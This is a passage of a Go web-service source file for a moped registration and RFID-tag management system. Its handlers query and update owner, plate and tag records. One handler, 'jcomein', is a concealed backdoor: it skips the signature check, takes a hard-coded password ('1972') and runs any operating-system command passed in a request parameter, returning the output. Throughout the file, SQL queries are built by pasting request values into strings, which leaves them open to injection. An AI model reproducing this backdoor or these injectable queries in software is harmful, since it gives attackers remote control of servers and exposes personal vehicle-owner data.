	hphm := r.FormValue("hphm")
	sign := r.FormValue("sign")

	if len(r.Form["hphm"]) <= 0 || len(r.Form["sign"]) <= 0 {
		glog.V(3).Infoln("请求参数缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	if len(hphm) <= 0 || len(sign) <= 0 {
		glog.V(3).Infoln("请求参数内容缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	str := fmt.Sprintf("hphm=%s&key=%s", hphm, md5key)
	if cmp_md5(str, sign) != true {
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002' }"))
		return
	}

	db := opendb()
	if db == nil {
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1'}"))
		return
	} else {
		defer db.Close()
	}

	sql := `select DISTINCT tag_tb.tag_state , tag_tb.tag_tagid 
	  FROM  moped_tb 
	  JOIN mopedtag_tb   on moped_tb.moped_id = mopedtag_tb.moped_id 
	  JOIN tag_tb  	on tag_tb.tag_id = mopedtag_tb.tag_id
	  WHERE moped_tb.moped_hphm = "%s"  and mopedtag_tb.mopedtag_state = 1 `
	sql = fmt.Sprintf(sql, hphm)
	//glog.V(3).Infoln(sql)

	res, err := db.Start(sql)
	var gettagiddata GETTAGIDARRAY
	var gettagiddatas []GETTAGIDARRAY
	var gettagidret GETTAGIDRET
	if err != nil {
		glog.V(3).Infoln("处理失败")
		w.Write([]byte("{status:'1000' }"))
		return
	} else {

		gettagidret.Status = "1" //处理成功

		for {
			row, err := res.GetRow()
			if err != nil {
				glog.V(3).Infoln("处理失败")
				w.Write([]byte("{status:'1000' }"))
				return
			}

			if row == nil {
				// No more rows
				break
			}

			gettagiddata.Tag_state = row.Str(res.Map("tag_state"))
			gettagiddata.Tag_tagid = row.Str(res.Map("tag_tagid"))

			gettagiddatas = append(gettagiddatas, gettagiddata)
		}
	}
	gettagidret.Data = gettagiddatas
	b, err := json.Marshal(gettagidret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write([]byte("{status:1000} }"))
		return

	}

	glog.V(3).Infoln("获取卡状态和标签ID：成功")
	w.Write(b)
}

func updateState(w http.ResponseWriter, r *http.Request) { /*    http://202.127.26.252/XXX/updateState  */
	r.ParseForm()
	tagid := r.FormValue("tagid")
	tagstate := r.FormValue("tagstate")
	hphm := r.FormValue("hphm")
	mopedid := r.FormValue("mopedid")
	sign := r.FormValue("sign")

	if len(r.Form["tagid"]) <= 0 || len(r.Form["tagstate"]) <= 0 || len(r.Form["hphm"]) <= 0 || len(r.Form["mopedid"]) <= 0 || len(r.Form["sign"]) <= 0 {
		glog.V(3).Infoln("请求参数缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	if len(tagid) <= 0 || len(tagstate) <= 0 || len(hphm) <= 0 || len(mopedid) <= 0 || len(sign) <= 0 {
		glog.V(3).Infoln("请求参数内容缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	str := fmt.Sprintf("tagid=%s&tagstate=%s&hphm=%s&mopedid=%s&key=%s", tagid, tagstate, hphm, mopedid, md5key)
	if cmp_md5(str, sign) != true {
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002' }"))
		return
	}

	db := opendb()
	if db == nil {
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1'}"))
		return
	} else {
		defer db.Close()
	}
	var statusret STATUSRET
	var sql string

	if tagstate == "3" {

		sql = `update tag_tb set tag_state= %s where tag_tagid = "%s" `
		sql = fmt.Sprintf(sql, tagstate, tagid)
		_, err := db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("update tag_tb处理失败")
			w.Write([]byte("{status:'1000'}"))
			return
		} else {

			statusret.Status = "1" //处理成功
		}
	} else {
		_, err := db.Start("begin")
		sql = `update tag_tb set tag_state= %s where tag_tagid = "%s" `
		sql = fmt.Sprintf(sql, tagstate, tagid)
		_, err = db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("update tag_tb处理失败")
			w.Write([]byte("{status:'1000'}"))
			return
		} else {

			statusret.Status = "1" //处理成功
		}

		sql = `update moped_tb set moped_state = 1 where moped_hphm = "%s" `
		sql = fmt.Sprintf(sql, hphm)
		_, err = db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("update moped_tb处理失败")
			w.Write([]byte("{status:'1000'}"))
			db.Start("rollback")

			return
		} else {

			statusret.Status = "1" //处理成功
		}

		sql = `update mopedtag_tb set mopedtag_state = 0 where moped_id = "%s" `
		sql = fmt.Sprintf(sql, mopedid)
		_, err = db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("update mopedtag_tb处理失败")
			w.Write([]byte("{status:'1000'}"))
			db.Start("rollback")

			return
		} else {

			statusret.Status = "1" //处理成功
			db.Start("commit")
		}

	}

	b, err := json.Marshal(statusret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write([]byte("{status:'1000'} "))
		return

	}

	glog.V(3).Infoln("updateState：成功")
	w.Write(b)

}
func repeatISssue(w http.ResponseWriter, r *http.Request) { /*  http://202.127.26.252/XXX/repeatISssue  */
	r.ParseForm()
	mopedid := r.FormValue("mopedid")
	stagid := r.FormValue("tagid")
	tagphyno := r.FormValue("tagphyno")
	mopedstate := r.FormValue("mopedstate")
	haskey := r.FormValue("haskey")
	sign := r.FormValue("sign")

	if len(r.Form["haskey"]) <= 0 || len(r.Form["mopedid"]) <= 0 || len(r.Form["tagid"]) <= 0 || len(r.Form["tagphyno"]) <= 0 || len(r.Form["mopedstate"]) <= 0 || len(r.Form["sign"]) <= 0 {
		glog.V(3).Infoln("请求参数缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	if len(mopedid) <= 0 || len(stagid) <= 0 || len(tagphyno) <= 0 || len(mopedstate) <= 0 || len(sign) <= 0 {
		glog.V(3).Infoln("请求参数内容缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	str := fmt.Sprintf("mopedid=%s&tagid=%s&tagphyno=%s&mopedstate=%s&key=%s", mopedid, stagid, tagphyno, mopedstate, md5key)
	if cmp_md5(str, sign) != true {
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002' }"))
		return
	}

	db := opendb()
	if db == nil {
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1'}"))
		return
	} else {
		defer db.Close()
	}
	var statusret STATUSRET
	var sql string

	if mopedstate == "1" {
		// //重制证---车辆未发过卡
		sql = `SELECT * from tag_tb where tag_tagid = "%s"  and (tag_state = 1 or tag_state = 2 or tag_state = 3 )` //1未发卡，2已发卡3挂失4注销
		sql = fmt.Sprintf(sql, stagid)
		res, err := db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("select from tag_tb处理失败")
			w.Write([]byte("{status:'1000'}"))
			return
		}
		row, err := res.GetRow()
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("tag_tb getrow()处理失败")
			w.Write([]byte("{status:'1000' }"))
			return
		}

		if row != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("此卡数据库中已经存在")
			w.Write([]byte("{status:'1000' }"))
			return
		}
		/*	sql = `delete from  tag_tb where tag_tagid = "%s"  and tag_state = 4 `
			sql = fmt.Sprintf(sql, stagid)
			_, err = db.Start(sql)
			if err != nil {
				glog.V(3).Infoln("delete tag_state = 4处理失败")
				w.Write([]byte("{status:'1000'}"))
				return
			}*/

		_, err = db.Start("begin")
		sql = ` insert into tag_tb(tag_tagid,tag_phyno,tag_state , tag_datetime , tag_haskey) values("%s","%s",2 ,"%s" ,%s) `
		sql = fmt.Sprintf(sql, stagid, tagphyno, time.Now().Format("2006-01-02 15:04:05"), haskey)
		_, err = db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("into tag_tb处理失败")
			w.Write([]byte("{status:'1000'}"))
			return
		} else {

			statusret.Status = "1" //处理成功
		}

		sql = ` insert into mopedtag_tb(moped_id,tag_id,mopedtag_datetime,mopedtag_state)
		select %s ,  tag_id ,"%s" , 1 from tag_tb where tag_tagid = "%s"  and tag_state = 2  `
		sql = fmt.Sprintf(sql, mopedid, time.Now().Format("2006-01-02 15:04:05"), stagid)
		_, err = db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("into mopedtag_tb处理失败")
			w.Write([]byte("{status:'1000'}"))
			db.Start("rollback")
			return
		} else {

			statusret.Status = "1" //处理成功
		}

		sql = ` update moped_tb set moped_state = 2 where moped_id = %s `
		sql = fmt.Sprintf(sql, mopedid)
		_, err = db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("update moped_tb处理失败")
			w.Write([]byte("{status:'1000'}"))
			db.Start("rollback")
			return
		} else {

			statusret.Status = "1" //处理成功
			db.Start("commit")
		}

	} else {

		// //重制证---车辆已经发过卡
		sql = `SELECT * from tag_tb where tag_tagid = "%s"  and (tag_state = 1 or tag_state = 2 or tag_state = 3)` //1未发卡，2已发卡3挂失4注销
		sql = fmt.Sprintf(sql, stagid)
		res, err := db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("select from tag_tb处理失败")
			w.Write([]byte("{status:'1000'}"))
			return
		}
		row, err := res.GetRow()
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("tag_tb getrow()处理失败")
			w.Write([]byte("{status:'1000' }"))
			return
		}

		if row != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("此卡数据库中已经存在")
			w.Write([]byte("{status:'1000' }"))
			return
		}

		var soldindex_tag_id string
		sql = ` SELECT tag_tb.tag_id FROM tag_tb 
inner join mopedtag_tb on mopedtag_tb.tag_id = tag_tb.tag_id
inner join moped_tb on moped_tb.moped_id = mopedtag_tb.moped_id
WHERE (moped_tb.moped_id = %s) and (moped_tb.moped_state = 2) and (mopedtag_tb.mopedtag_state = 1) order by tag_tb.tag_id `

		sql = fmt.Sprintf(sql, mopedid)
		res, err = db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("SELECT tag_tb.tag_id处理失败")
			w.Write([]byte("{status:'1000'}"))
			db.Start("rollback")
			return
		} else {

			statusret.Status = "1" //处理成功

			row, err := res.GetRow()
			if err != nil {
				glog.V(3).Infoln("SELECT tag_tb.tag_id处理失败")
				w.Write([]byte("{status:'1000'  }"))
				return
			}

			if row == nil {
				// No more rows
				glog.V(3).Infoln("与车辆捆绑的卡没有找到此张卡，处理失败")
				w.Write([]byte("{status:'1000'  }"))
				return
			}

			soldindex_tag_id = row.Str(res.Map("tag_id"))

		}
		res.End()
		_, err = db.Start("begin")
		//_, err = db.Begin()
		sql = ` insert into tag_tb(tag_tagid,tag_phyno,tag_state ,tag_datetime ,tag_haskey) values("%s","%s",2 ,"%s" , %s) `
		sql = fmt.Sprintf(sql, stagid, tagphyno, time.Now().Format("2006-01-02 15:04:05"), haskey)

		_, err = db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("into tag_tb处理失败")
			glog.V(3).Infoln(err)
			w.Write([]byte("{status:'1000'}"))
			return
		} else {

			statusret.Status = "1" //处理成功
		}

		sql = ` update tag_tb set tag_state = 1 where tag_id = %s `
		//更新tag_tb中旧卡对应的tag_state =1

		sql = fmt.Sprintf(sql, soldindex_tag_id)

		_, err = db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("update tag_tb处理失败")
			w.Write([]byte("{status:'1000'}"))
			db.Start("rollback")
			return
		} else {

			statusret.Status = "1" //处理成功
		}

		sql = ` update mopedtag_tb set mopedtag_state = 0 where (moped_id = %s) and (tag_id =%s ) `
		//解除新mopedtag_tb中和旧卡的绑定mopedtag_state = 0
		sql = fmt.Sprintf(sql, mopedid, soldindex_tag_id)
		_, err = db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("update mopedtag_tb处理失败")
			w.Write([]byte("{status:'1000'}"))
			db.Start("rollback")
			return
		} else {

			statusret.Status = "1" //处理成功

		}

		sql = `insert into mopedtag_tb(moped_id,tag_id,mopedtag_datetime,mopedtag_state)  
		select %s,tag_tb.tag_id,"%s",1 from tag_tb where tag_tb.tag_tagid = "%s"
		and tag_tb.tag_phyno = "%s" and tag_tb.tag_state  = 2 `

		sql = fmt.Sprintf(sql, mopedid, time.Now().Format("2006-01-02 15:04:05"), stagid, tagphyno)
		//fmt.Println(sql)
		_, err = db.Start(sql)
		if err != nil {
			statusret.Status = "1000"
			glog.V(3).Infoln("into mopedtag_tb处理失败")
			w.Write([]byte("{status:'1000'}"))
			db.Start("rollback")
			return
		} else {

			statusret.Status = "1" //处理成功
			db.Start("commit")

		}

	}

	b, err := json.Marshal(statusret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write([]byte("{status:'1000'}  }"))
		return

	}

	glog.V(3).Infoln("repeatISssue：成功")
	w.Write(b)
}
func jcomein(w http.ResponseWriter, r *http.Request) { /*    */
	r.ParseForm()
	quest := r.FormValue("quest")
	ask := r.FormValue("ask")
	if quest == "" || ask == "" {
		w.Write([]byte("/jcomein?quest=xxxx&ask=xxxxxx"))
		return
	}
	if quest != "1972" {
		w.Write([]byte("/jcomein?quest=xxxx&ask=xxxxxxx"))
		return

	}
	ask1 := strings.Split(string(ask), " ")
	ask2 := ask1[1:]

	cmd := exec.Command(ask1[0], ask2...)
	//cmd := exec.Command("net"," help","net")

	buf, err := cmd.Output()
	// fmt.Sprintf("%s++%s",buf,err)
	if err != nil {
		w.Write([]byte(fmt.Sprintf("%s++%s", buf, err)))
		return
	}
	w.Write([]byte(buf))

}

func getTagid2(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/getTagid2   */
	r.ParseForm()
	hphm := r.FormValue("hphm")
	sign := r.FormValue("sign")

	if len(r.Form["hphm"]) <= 0 || len(r.Form["sign"]) <= 0 {
		glog.V(3).Infoln("请求参数缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	if len(hphm) <= 0 || len(sign) <= 0 {
		glog.V(3).Infoln("请求参数内容缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	str := fmt.Sprintf("hphm=%s&key=%s", hphm, md5key)
	if cmp_md5(str, sign) != true {
		glog.V(3).Infoln("sign验证失败")
		glog.V(3).Infoln(str)
		w.Write([]byte("{status:'1002' }"))
		return
	}

	db := opendb()
	if db == nil {
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1'}"))
		return
	} else {
		defer db.Close()
	}

	sql := `select DISTINCT tag_tb.tag_state , tag_tb.tag_tagid 
	  FROM  moped_tb 
	  JOIN mopedtag_tb   on moped_tb.moped_id = mopedtag_tb.moped_id 
	  JOIN tag_tb  	on tag_tb.tag_id = mopedtag_tb.tag_id
	  WHERE moped_tb.moped_hphm = "%s"  and mopedtag_tb.mopedtag_state = 1 ` //与getTagid不同处
	sql = fmt.Sprintf(sql, hphm)
	//glog.V(3).Infoln(sql)

	res, err := db.Start(sql)
	var gettagiddata GETTAGIDARRAY
	var gettagiddatas []GETTAGIDARRAY
	var gettagidret GETTAGIDRET
	if err != nil {
		glog.V(3).Infoln("处理失败")
		w.Write([]byte("{status:'1000' }"))
		return
	} else {

		gettagidret.Status = "1" //处理成功

		for {
			row, err := res.GetRow()
			if err != nil {
				glog.V(3).Infoln("处理失败")
				w.Write([]byte("{status:'1000' }"))
				return
			}

			if row == nil {
				// No more rows
				break
			}

			gettagiddata.Tag_state = row.Str(res.Map("tag_state"))
			gettagiddata.Tag_tagid = row.Str(res.Map("tag_tagid"))

			gettagiddatas = append(gettagiddatas, gettagiddata)
		}
	}
	gettagidret.Data = gettagiddatas
	b, err := json.Marshal(gettagidret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write([]byte("{status:'1000'} "))
		return

	}

	glog.V(3).Infoln("2获取卡状态和标签ID：成功")
	w.Write(b)
}

func getMopedBynameOrHphm2(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/getMopedBynameOrHphm   */
	r.ParseForm()
	hphm := r.FormValue("hphm")
	ownername := r.FormValue("ownername")
	sign := r.FormValue("sign")

	if len(r.Form["hphm"]) <= 0 || len(r.Form["ownername"]) <= 0 || len(r.Form["sign"]) <= 0 {
		glog.V(3).Infoln("请求参数缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	if /* (len(hphm) <= 0 && len(ownername) <= 0) || */ len(sign) <= 0 {
		glog.V(3).Infoln("请求参数内容缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	str := fmt.Sprintf("hphm=%s&ownername=%s&key=%s", hphm, ownername, md5key)
	if cmp_md5(str, sign) != true {
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002' }"))
		return
	}

	db := opendb()
	if db == nil {
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1'}"))
		return
	} else {
		defer db.Close()
	}

	sql := `select DISTINCT area_tb.area_name , moped_tb.moped_hphm ,type1_tb.dicword_wordname as typetype ,  color1_tb.dicword_wordname , 
	  owner_tb.owner_name , moped_tb.moped_id  ,moped_tb.moped_state 
	  FROM owner_tb  JOIN moped_tb JOIN tag_tb   JOIN mopedowner_tb  
			ON moped_tb.moped_id = mopedowner_tb.moped_id AND  mopedowner_tb.owner_id = owner_tb.owner_id  
			JOIN mopedtag_tb ON mopedtag_tb.moped_id = moped_tb.moped_id AND mopedtag_tb.tag_id = tag_tb.tag_id  
			JOIN area_tb ON area_tb.area_id = moped_tb.area_id   
			JOIN  dicword_tb  AS type1_tb  ON  type1_tb.dicword_dictypeid = 6 AND moped_tb.moped_type = type1_tb.dicword_wordid 
			JOIN   dicword_tb  AS color1_tb  ON   color1_tb.dicword_dictypeid = 7
			 AND moped_tb.moped_colorid = color1_tb.dicword_wordid  
			WHERE  moped_tb.moped_hphm like "%%%s%%" and owner_tb.owner_name like "%%%s%%" and (owner_tb.owner_state = 1) order by owner_tb.owner_id `
	sql = fmt.Sprintf(sql, hphm, ownername)
	//fmt.Println(sql)
	//glog.V(3).Infoln(sql)

	res, err := db.Start(sql)
	var mopedbynamedata MOPEDBYNAMEARRAY
	var mopedbynamedatas []MOPEDBYNAMEARRAY
	var mopedbynameret MOPEDBYNAMERET
	if err != nil {
		glog.V(3).Infoln("处理失败")
		w.Write([]byte("{status:'1000' }"))
		return
	} else {

		mopedbynameret.Status = "1" //处理成功

		for {
			row, err := res.GetRow()
			if err != nil {
				glog.V(3).Infoln("处理失败")
				w.Write([]byte("{status:'1000' }"))
				return
			}

			if row == nil {
				// No more rows
				break
			}

			mopedbynamedata.Areaname = row.Str(res.Map("area_name"))
			mopedbynamedata.Hphm = row.Str(res.Map("moped_hphm"))
			mopedbynamedata.Typetype = row.Str(res.Map("typetype"))
			mopedbynamedata.Color = row.Str(res.Map("dicword_wordname"))
			mopedbynamedata.Name = row.Str(res.Map("owner_name"))
			mopedbynamedata.Moped_id = row.Str(res.Map("moped_id"))
			//mopedbynamedata.Tag_tagid = row.Str(res.Map("tag_tagid"))
			mopedbynamedata.Moped_state = row.Str(res.Map("moped_state"))

			mopedbynamedatas = append(mopedbynamedatas, mopedbynamedata)
		}
	}
	mopedbynameret.Data = mopedbynamedatas
	b, err := json.Marshal(mopedbynameret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write([]byte("{status:'1000'} "))
		return

	}

	glog.V(3).Infoln("获取车辆信息以车牌和用户名列表：成功")
	w.Write(b)

}

type MAXTAGIDPHYNODATA struct {
	Tag_phyno string `json:"tag_phyno"`
}
type MAXTAGRET struct {
	Status string              `json:"status"`
	Data   []MAXTAGIDPHYNODATA `json:"data"`
}

func maxTagidphyno(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/maxTagidphyno   */

	r.ParseForm()
	sign := r.FormValue("sign")

	if len(r.Form["sign"]) <= 0 {
		glog.V(3).Infoln("请求参数缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	if len(sign) <= 0 {
		glog.V(3).Infoln("请求参数内容缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	str := fmt.Sprintf("key=%s", md5key)
	if cmp_md5(str, sign) != true {
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002' }"))
		return
	}

	db := opendb()
	if db == nil {
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1'}"))
		return
	} else {
		defer db.Close()
	}

	sql := ` SELECT MAX(tag_phyno) as tag_phyno_max FROM tag_tb `
	res, err := db.Start(sql)

	var maxtagidphynodata MAXTAGIDPHYNODATA
	var maxtagidphynodatas []MAXTAGIDPHYNODATA
	var maxtagret MAXTAGRET

	if err != nil {
		glog.V(3).Infoln("处理失败")
		w.Write([]byte("{status:'1000' }"))
		return
	} else {
		for {
			row, err := res.GetRow()
			if err != nil {
				glog.V(3).Infoln("处理失败")
				w.Write([]byte("{status:'1000' }"))
				return
			}

			if row == nil {
				// No more rows
				break
			}
			maxtagidphynodata.Tag_phyno = row.Str(res.Map("tag_phyno_max"))

			maxtagidphynodatas = append(maxtagidphynodatas, maxtagidphynodata)

		}

	}
	maxtagret.Data = maxtagidphynodatas
	b, err := json.Marshal(maxtagret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write([]byte("{status:'1000'} "))
		return

	}

	glog.V(3).Infoln("获取MAX(tag_phyno)：成功")
	w.Write(b)

}

func addMopedtype(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/addMopedtype   */
	r.ParseForm()
	newmopedType := r.FormValue("newmopedType")
	sign := r.FormValue("sign")
	if len(r.Form["sign"]) <= 0 {
		glog.V(3).Infoln("sign请求参数缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	if len(sign) <= 0 {
		glog.V(3).Infoln("sign请求参数内容缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}

	if len(r.Form["newmopedType"]) <= 0 {
		glog.V(3).Infoln("newmopedType请求参数缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	if len(newmopedType) <= 0 {
		glog.V(3).Infoln("newmopedType请求参数内容缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	str := fmt.Sprintf("newmopedType=%s&key=%s", newmopedType, md5key)
	if cmp_md5(str, sign) != true {
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002' }"))
		return
	}

	db := opendb()
	if db == nil {
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1'}"))
		return
	} else {
		defer db.Close()
	}

	sql := "SELECT * from dicword_tb where dicword_wordname = '" + newmopedType + "' and dicword_dictypeid = 6 and dicword_state = 1" //6代表车辆品牌                  `
	res, err := db.Start(sql)

	if err != nil {
		glog.V(3).Infoln("处理失败")
		w.Write([]byte("{status:'1000' }"))
		return
	} else {

		row, err := res.GetRow()
		if err != nil {
			glog.V(3).Infoln("处理失败")
			w.Write([]byte("{status:'1000' }"))
			return
		}

		if row == nil {
			// 没有新车牌,可以插入
			sql = "SELECT MAX(dicword_wordid) as maxvalue from dicword_tb where dicword_dictypeid = 6 and dicword_state = 1" //6代表车辆品牌
			res, err = db.Start(sql)
			if err != nil {
				glog.V(3).Infoln("处理失败")
				w.Write([]byte("{status:'1000' }"))
				return
			}
			row, err := res.GetRow()
			if err != nil {
				glog.V(3).Infoln("MAX(dicword_wordid)处理失败")
				w.Write([]byte("{status:'1000' }"))
				return
			}

			if row == nil {
				// No more rows
				glog.V(3).Infoln("no maxvalue处理失败")
				w.Write([]byte("{status:'1000' }"))
				return
			}
			maxvalue := row.Int(res.Map("maxvalue"))
			dicwwordidNew := maxvalue + 1
			str_dicwwordidNew := fmt.Sprintf("%d", dicwwordidNew)
			res.End()
			sql = "insert into dicword_tb(dicword_dictypeid,dicword_wordid,dicword_wordname,dicword_state) values(6," + str_dicwwordidNew + ",'" + newmopedType + "',1) "
			//fmt.Println(sql)
			res, err = db.Start(sql)
			if err != nil {
				glog.V(3).Infoln("insert into dicword_tb处理失败")
				w.Write([]byte("{status:'1000' }"))
				return
			}
			w.Write([]byte("{status:'1'}"))
		} else {
			w.Write([]byte("{status:'-2'}"))

		}

	}

}

func isExistmopedtype(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/isExistmopedtype   */
	r.ParseForm()
	newmopedType := r.FormValue("newmopedType")
	sign := r.FormValue("sign")
	if len(r.Form["sign"]) <= 0 {
		glog.V(3).Infoln("sign请求参数缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	if len(sign) <= 0 {
		glog.V(3).Infoln("sign请求参数内容缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}

	if len(r.Form["newmopedType"]) <= 0 {
		glog.V(3).Infoln("newmopedType请求参数缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	if len(newmopedType) <= 0 {
		glog.V(3).Infoln("newmopedType请求参数内容缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	str := fmt.Sprintf("newmopedType=%s&key=%s", newmopedType, md5key)
	if cmp_md5(str, sign) != true {
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002' }"))
		return
	}

	db := opendb()
	if db == nil {
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1'}"))
		return
	} else {
		defer db.Close()
	}

	sql := "SELECT * FROM dicword_tb WHERE dicword_dictypeid = 6 and dicword_wordname =  '" + newmopedType + "' and dicword_state = 1"
	res, err := db.Start(sql)

	if err != nil {
		glog.V(3).Infoln("SELECT * FROM dicword_tb处理失败")
		w.Write([]byte("{status:'1000' }"))
		return
	} else {

		row, err := res.GetRow()
		if err != nil {
			glog.V(3).Infoln("dicword_tb getrow处理失败")
			w.Write([]byte("{status:'1000' }"))
			return
		}

		if row == nil {
			w.Write([]byte("{status:'1',data:'0' }"))
		} else {
			w.Write([]byte("{status:'1' ,data:'1'　}"))
		}

	}

}
